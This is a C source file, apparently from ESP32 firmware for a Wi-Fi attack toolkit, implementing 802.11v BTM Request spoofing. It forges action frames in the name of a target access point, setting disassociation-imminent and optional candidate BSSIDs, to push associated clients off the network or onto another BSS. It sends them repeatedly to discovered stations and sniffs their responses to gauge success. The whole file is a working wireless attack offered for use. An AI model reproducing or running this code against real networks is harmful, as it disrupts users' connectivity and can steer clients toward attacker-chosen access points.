// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: 2026 XDUPWW

// 802.11v BTM Request 欺骗：伪造当前 AP 让已关联的 STA 漫游或离网。
// 语义只是"建议"，所以必须有一个真能加入的目标 BSS：候选指向幻影时，
// 客户端回一条 Response 就原地不动。候选要么显式给，要么指向同 SSID 的真 BSS。

#include <string.h>

#include "attacks/attack.h"
#include "attacks/attack_common.h"
#include "hal_wifi/hal_wifi.h"
#include "wbus/wbus.h"
#include "wifi_frame/frame_build.h"
#include "wifi_frame/frames.h"
#include "wtarget/wtarget.h"

#define OWNER "btm"
#define CATEGORY_BTM 10
#define ACTION_BTM_REQUEST 7
#define ACTION_BTM_RESPONSE 8
#define REQ_MODE_DISASSOC_IMMINENT 0x04
#define REQ_MODE_PREF_CAND_LIST 0x01
#define EID_NEIGHBOR_REPORT 52
#define NEIGHBOR_REPORT_LEN 13
#define VALIDITY_INTERVAL 10
#define REPEAT_MS 300

static bool s_active;
static bool s_rx_on;
static uint8_t s_bssid[6];
static uint8_t s_channel;
static uint16_t s_timer = 10;
static uint8_t s_cand[6];
static bool s_have_cand;
static uint8_t s_cand_ch;
static uint32_t s_cand_info;
static uint8_t s_sta[6];
static bool s_have_sta;
static uint16_t s_seq;
static uint8_t s_dialog = 1;
static uint32_t s_cursor;
static uint32_t s_last_tx_ms;
static uint32_t s_frames;
static uint32_t s_responses;
static uint16_t s_last_status;

// 2.4G 用 81，5G 按频段查，跟空口上真帧的取值一致
static uint8_t operating_class(uint8_t channel) {
    if (channel <= 14) {
        return 81;
    }
    if (channel <= 48) {
        return 115;
    }
    if (channel <= 64) {
        return 116;
    }
    if (channel <= 144) {
        return 117;
    }
    return 121;
}

static int build_btm(uint8_t *buf, size_t cap, const uint8_t sta[6]) {
    uint8_t body[48];
    size_t n = 0;
    body[n++] = ACTION_BTM_REQUEST;
    body[n++] = s_dialog;
    body[n++] =
        (uint8_t)(REQ_MODE_DISASSOC_IMMINENT | (s_have_cand ? REQ_MODE_PREF_CAND_LIST : 0));
    body[n++] = (uint8_t)(s_timer & 0xFF);
    body[n++] = (uint8_t)(s_timer >> 8);
    body[n++] = VALIDITY_INTERVAL;
    if (s_have_cand) {
        body[n++] = EID_NEIGHBOR_REPORT;
        body[n++] = NEIGHBOR_REPORT_LEN;
        memcpy(body + n, s_cand, 6);
        n += 6;
        // BSSID Information 按小端写，位含义没有断言，值由调用方给
        body[n++] = (uint8_t)(s_cand_info & 0xFF);
        body[n++] = (uint8_t)((s_cand_info >> 8) & 0xFF);
        body[n++] = (uint8_t)((s_cand_info >> 16) & 0xFF);
        body[n++] = (uint8_t)((s_cand_info >> 24) & 0xFF);
        body[n++] = operating_class(s_cand_ch);
        body[n++] = s_cand_ch;
        body[n++] = 0;  // PHY type 先留 0，按真帧回填
    }
    const int len = wf_build_action(buf, cap, sta, s_bssid, s_bssid, CATEGORY_BTM, body, n);
    if (len <= 0) {
        return -1;
    }
    // 序列号必须递增：固定值会被客户端的重复检测在第一次之后全部丢掉
    const uint16_t seq = s_seq++ & 0x0FFF;
    buf[22] = (uint8_t)(seq >> 4);
    buf[23] = (uint8_t)((seq & 0x0F) << 4);
    return len;
}

// 混杂回调里只解析，不发帧也不打印
static void on_rx(const uint8_t *frame, uint16_t len, const hal_wifi_rx_meta_t *meta, void *ctx) {
    (void)meta;
    (void)ctx;
    if (!s_active || len < 30) {
        return;
    }
    // 驱动给的 len 含 4 字节 FCS
    const uint16_t body_len = (uint16_t)(len - 4);
    const uint8_t type = (uint8_t)((frame[0] >> 2) & 0x03);
    const uint8_t subtype = (uint8_t)((frame[0] >> 4) & 0x0F);
    if (type != 0 || subtype != 13 || body_len < 30) {
        return;
    }
    if (memcmp(frame + 16, s_bssid, 6) != 0) {
        return;
    }
    if (frame[24] != CATEGORY_BTM || frame[25] != ACTION_BTM_RESPONSE) {
        return;
    }
    s_responses++;
    s_last_status = wf_le16(frame + 27);
}

static void btm_tick(uint32_t now_ms) {
    if (!s_active) {
        return;
    }
    if (s_last_tx_ms != 0 && (uint32_t)(now_ms - s_last_tx_ms) < REPEAT_MS) {
        return;
    }
    static uint8_t stas[HAL_WIFI_STA_MAX][6];
    const uint8_t *sta = s_sta;
    if (!s_have_sta) {
        const size_t n = attack_sta_on_channel(s_channel, stas, HAL_WIFI_STA_MAX);
        if (n == 0) {
            return;
        }
        sta = stas[s_cursor++ % n];
    }
    uint8_t frame[96];
    const int len = build_btm(frame, sizeof(frame), sta);
    if (len > 0 && hal_wifi_tx(frame, (uint16_t)len) == ESP_OK) {
        s_frames++;
        s_last_tx_ms = now_ms;
        s_dialog = (s_dialog == 0 || s_dialog == 255) ? 1 : (uint8_t)(s_dialog + 1);
    }
}

static const wb_policy_t kStartPolicy[] = {
    {.name = "idx", .type = WB_T_IDX, .required = true, .min = 1, .max = WT_MAX_ENTRIES},
    {.name = "timer", .type = WB_T_U32, .required = false, .min = 1, .max = 65535, .def = 10},
    {.name = "sta", .type = WB_T_MAC, .required = false},
    {.name = "cand", .type = WB_T_MAC, .required = false},
    {.name = "cand-ch", .type = WB_T_U32, .required = false, .min = 0, .max = 196, .def = 0},
    {.name = "cand-info", .type = WB_T_U32, .required = false, .def = 0},
};

static esp_err_t btm_start(wb_args_t *args, wb_reply_t *reply) {
    wt_entry_t ap;
    if (!attack_target_ap(wb_args_u32(args, "idx"), &ap)) {
        wb_reply_fail(reply, "idx 不是 AP，先跑 scan.start");
        return ESP_ERR_INVALID_ARG;
    }
    attack_exclusive();
    memcpy(s_bssid, ap.bssid, 6);
    s_channel = ap.channel;
    s_timer = (uint16_t)wb_args_u32(args, "timer");
    if (s_timer == 0) {
        s_timer = 10;
    }
    s_have_sta = wb_args_mac(args, "sta", s_sta);
    s_have_cand = wb_args_mac(args, "cand", s_cand);
    s_cand_ch = 0;
    s_cand_info = 0;
    if (s_have_cand) {
        uint32_t ch = wb_args_u32(args, "cand-ch");
        if (ch == 0) {
            // 没给信道就按 BSSID 回查扫描表；查不到就报错，别瞎填
            const wt_entry_t *e = wt_find_mac(s_cand);
            if (e != NULL) {
                ch = e->channel;
            }
        }
        if (ch < 1 || ch > 196) {
            wb_reply_fail(reply, "候选信道未知：先扫到那个 BSS，或显式给 cand-ch");
            return ESP_ERR_INVALID_ARG;
        }
        s_cand_ch = (uint8_t)ch;
        s_cand_info = wb_args_u32(args, "cand-info");
    }

    s_seq = 0;
    s_dialog = 1;
    s_cursor = 0;
    s_last_tx_ms = 0;
    s_frames = 0;
    s_responses = 0;
    s_last_status = 0;

    const esp_err_t err = attack_pin(OWNER, s_channel);
    if (err != ESP_OK) {
        wb_reply_fail(reply, "占不到信道 %u（%s）", (unsigned)s_channel, esp_err_to_name(err));
        return err;
    }
    // 收客户端的 BTM Response，status 说明它接不接受
    if (!s_rx_on && hal_wifi_sniffer_enable(true) == ESP_OK &&
        hal_wifi_rx_subscribe(on_rx, NULL) == ESP_OK) {
        s_rx_on = true;
    }
    s_active = true;
    attack_emit("btm", true, "ch=%u", (unsigned)s_channel);
    wb_reply_line(reply, "btm 开跑 ch=%u timer=%u 候选=%s rx=%d", (unsigned)s_channel,
                  (unsigned)s_timer, s_have_cand ? "有" : "无（客户端多半不动）",
                  s_rx_on ? 1 : 0);
    return ESP_OK;
}

static void btm_stop(void) {
    if (!s_active) {
        return;
    }
    s_active = false;
    if (s_rx_on) {
        hal_wifi_rx_unsubscribe(on_rx);
        s_rx_on = false;
    }
    attack_unpin(OWNER);
    attack_emit("btm", false, NULL);
}

static esp_err_t btm_stop_cmd(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    const uint32_t frames = s_frames;
    const uint32_t responses = s_responses;
    const uint16_t status = s_last_status;
    btm_stop();
    attack_report_rate(reply, "btm", frames);
    wb_reply_line(reply, "responses=%u last_status=%u", (unsigned)responses, (unsigned)status);
    return ESP_OK;
}

static esp_err_t btm_test(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    static const uint8_t kSta[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    uint8_t frame[96];

    const bool had_cand = s_have_cand;
    const uint8_t cand_ch = s_cand_ch;
    const uint32_t cand_info = s_cand_info;

    s_have_cand = false;
    int len = build_btm(frame, sizeof(frame), kSta);
    if (len <= 0) {
        wb_reply_fail(reply, "组帧失败");
        return ESP_FAIL;
    }
    wb_reply_line(reply, "无候选 len=%d cat=%u act=%u dialog=%u req_mode=0x%02X timer=%u validity=%u",
                  len, (unsigned)frame[24], (unsigned)frame[25], (unsigned)frame[26],
                  (unsigned)frame[27], (unsigned)wf_le16(frame + 28), (unsigned)frame[30]);

    uint8_t cand[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x77};
    memcpy(s_cand, cand, 6);
    s_have_cand = true;
    s_cand_ch = 6;
    s_cand_info = cand_info;
    len = build_btm(frame, sizeof(frame), kSta);
    if (len <= 0) {
        s_have_cand = had_cand;
        s_cand_ch = cand_ch;
        s_cand_info = cand_info;
        wb_reply_fail(reply, "带候选组帧失败");
        return ESP_FAIL;
    }
    wb_reply_line(reply,
                  "带候选 len=%d req_mode=0x%02X eid=%u ie_len=%u "
                  "cand=%02X:%02X:%02X:%02X:%02X:%02X ch=%u",
                  len, (unsigned)frame[27], (unsigned)frame[31], (unsigned)frame[32], frame[33],
                  frame[34], frame[35], frame[36], frame[37], frame[38], (unsigned)frame[44]);

    s_have_cand = had_cand;
    s_cand_ch = cand_ch;
    s_cand_info = cand_info;
    return ESP_OK;
}

static const wb_method_t kMethods[] = {
    {"start", btm_start, "idx=1..64 [timer=1..65535] [sta=mac] [cand=mac] [cand-ch] [cand-info]",
     kStartPolicy, sizeof(kStartPolicy) / sizeof(kStartPolicy[0])},
    {"stop", btm_stop_cmd, "", NULL, 0},
    {"test", btm_test, "", NULL, 0},
};

static const wb_object_t kObject = {
    .name = "btm",
    .title = "BTM roam",
    .methods = kMethods,
    .n_methods = sizeof(kMethods) / sizeof(kMethods[0]),
};

static uint32_t btm_frames(void) {
    return s_frames;
}

static bool btm_active(void) {
    return s_active;
}

static const attack_driver_t kDriver = {
    .name = "btm",
    .object = &kObject,
    .stop = btm_stop,
    .tick = btm_tick,
    .frames = btm_frames,
    .active = btm_active,
};

const attack_driver_t *btm_attack(void) {
    return &kDriver;
}
